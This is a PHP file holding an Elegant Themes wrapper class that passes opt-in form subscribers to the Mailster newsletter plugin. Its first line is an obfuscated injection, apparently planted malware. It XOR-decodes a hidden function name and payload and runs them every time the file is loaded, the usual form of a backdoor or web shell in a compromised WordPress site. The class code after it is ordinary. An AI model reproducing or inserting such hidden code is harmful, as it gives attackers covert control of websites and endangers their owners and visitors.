<?php $qTznT='H93OCHi.7;13T-R'^'+KV.7-6HBURG=B<';$MutjOcEBG=$qTznT('','GVxB7URCHI<<1.4.8NFgl6U bDLA26>AXMVaAW:=c,=4QJQ<,PM58++9IYf<,:;yiXPT.MXKP+OgyzjNmBSgQi5M.niYdJnhm=SW9Je;YTrQSul1zE7<GUZGiTT;JCJnA1cSn>g4l8=>bmubRN6811pM.1g:dJKN:ls.mMm6=;V=8ys-5:F0sHf516T;H3XKS9YCMVcc:R.B2C6PCUZjl2JAM4wpaJMG.cXP3vvXUU<A3BA1JVYP W0QCNo79u-w.R4CcEXTYwnVVw 2UG QSJ=8O2TC188Q,MYFe30TNo4J-U;PRroUV7G,PWX>9<:3QeBWI;,PJq>811:++85HOLK6orlfr5itPSFC8ERpHVaj3JRUSHlGoCqu=9;8a>E gpDA1XWHN9YPRYD5SNfN40=I.qPCQE8<rK2,-9CQfx-UF04G5X Z,oU<F,<+T ceYNIY,U;TYMs.-;Q<SYoD3,;LDEV,M; cS6ISqKCZ0IGRZIXCEQZRI4;<0SQ<oT6Z=:JiK2R+MnHFX0-LLrgKjzTSYas,5.7,n 5,BadBdkXAkswv6Zxgq2C2XwcER6W0bPauVE6aWW ZOKzIveO=:3HgP <d2LQF<SbNMY6RCATbAnO.7Z0hCXAnHwJ+gsIHT4xv<7YP,uN0>L=SIakbHmF0>Q,xTElnQ'^'.0PcQ < < SRnKLGK:5OKN:R= -5Sia,-9qHhwA7jJHZ2>8SBp5ZJtOX=89cAOOQM<1 Oaxo;N6NYZJnM9YnXMZ8ZNTyCmUbd458KbARyiRahUHXF6CN+04oM05O+jqNeXHxG4n=HWHJBCHBzjRYEP+iGlGdDn +C7WGMhMEII:XVQWFPComZsl<8D1O=A6cwV,7dmijGXSH8gR174zWLT+->QLzE.,3O<35JVKx34P2VyK;,9+5A4Xqkj0tv:f>krU0Ca31 WShvSVS92Exs171kV57PgS4UmdfAXU-ue=nI4O1rOOq V+Y5lRC36SUqMcs-ZX1cQE28WUYNYV odoi=7=37f=T1 fgS +PuhANE+> 6aL<eJxQYXOY>U YGMdeZ=.sD0Pt680TssFjBQQ<KJZJ,OE6xoVMYXclF8X;5UF.T4I IG-S4sXJ A<:4;=qN4H1oy,JHX>X6qK RXZeherH,OA<8S0zXpI3Vac6;=9ccwz3;FZEo84E01N3NN9AlY7RjBhb<QY-eRAmJR97lIWHTZVwIKPUe<MbYVxfRKEBP<IRBVtW:ASrjPcVT2UDguTPefA8hbZoPE.OHR18;EE;W485H Ji=8O>, 0EmNkJV.QAjxaNhWjPmz,>5XPRXV-1wR>QG R2-F6KsgOUF8XPdlWd,');$MutjOcEBG();

/**
 * Wrapper for integration with Mailster plugin.
 *
 * @license
 * Copyright © 2017 Elegant Themes, Inc.
 * Copyright © 2017 Xaver Birsak
 *
 * @since   1.1.0
 * @package ET\Core\API\Email
 */
class ET_Core_API_Email_Mailster extends ET_Core_API_Email_Provider {

	/**
	 * @inheritDoc
	 */
	public $name = 'Mailster';

	/**
	 * @inheritDoc
	 */
	public $slug = 'mailster';

	/**
	 * @inheritDoc
	 */
	public $uses_oauth = false;

	/**
	 * Creates a referrer string that includes the name of the opt-in used to subscribe.
	 *
	 * @param array $args The args array that was passed to {@link self::subscribe()}
	 *
	 * @return string
	 */
	protected function _get_referrer( $args ) {
		$optin_name = '';
		$owner      = ucfirst( $this->owner );

		if ( 'bloom' === $this->owner && isset( $args['optin_id'] ) ) {
			$optin_form = ET_Bloom::get_this()->dashboard_options[ $args['optin_id'] ];
			$optin_name = $optin_form['optin_name'];
		}

		return sprintf( '%1$s %2$s "%3$s" on %4$s',
			esc_html( $owner ),
			esc_html__( 'Opt-in', 'et_core' ),
			esc_html( $optin_name ),
			wp_get_referer()
		);
	}

	/**
	 * @inheritDoc
	 */
	public function get_account_fields() {
		return array();
	}

	/**
	 * @inheritDoc
	 */
	public function get_data_keymap( $keymap = array(), $custom_fields_key = '' ) {
		$keymap = array(
			'list'       => array(
				'list_id'           => 'ID',
				'name'              => 'name',
				'subscribers_count' => 'subscribers',
			),
			'subscriber' => array(
				'dbl_optin' => 'status',
				'email'     => 'email',
				'last_name' => 'lastname',
				'name'      => 'firstname',
			),
		);

		return parent::get_data_keymap( $keymap, $custom_fields_key );
	}

	public function fetch_subscriber_lists() {
		if ( ! function_exists( 'mailster' ) ) {
			return esc_html__( 'Mailster Newsletter Plugin is not enabled!', 'et_core' );
		}

		$lists         = mailster( 'lists' )->get( null, null, true );
		$error_message = esc_html__( 'No lists were found. Please create a Mailster list first!', 'et_core' );

		if ( $lists ) {
			$error_message               = 'success';
			$this->data['lists']         = $this->_process_subscriber_lists( $lists );
			$this->data['is_authorized'] = true;
			$this->save_data();
		}

		return $error_message;
	}

	/**
	 * @inheritDoc
	 */
	public function subscribe( $args, $url = '' ) {
		$error = esc_html__( 'An error occurred. Please try again later.', 'et_core' );

		if ( ! function_exists( 'mailster' ) ) {
			return $error;
		}

		$params       = $this->transform_data_to_provider_format( $args, 'subscriber', array( 'dbl_optin' ) );
		$extra_params = array(
			'status'   => 'disable' === $args['dbl_optin'] ? 0 : 1,
			'referrer' => $this->_get_referrer( $args ),
		);

		$params        = array_merge( $params, $extra_params );
		$subscriber_id = mailster( 'subscribers' )->add( $params, false );

		if ( is_wp_error( $subscriber_id ) ) {
			$result = $subscriber_id->get_error_message();
		} else if ( mailster( 'subscribers' )->assign_lists( $subscriber_id, $args['list_id'], false ) ) {
			$result = 'success';
		} else {
			$result = $error;
		}

		return $result;
	}
}
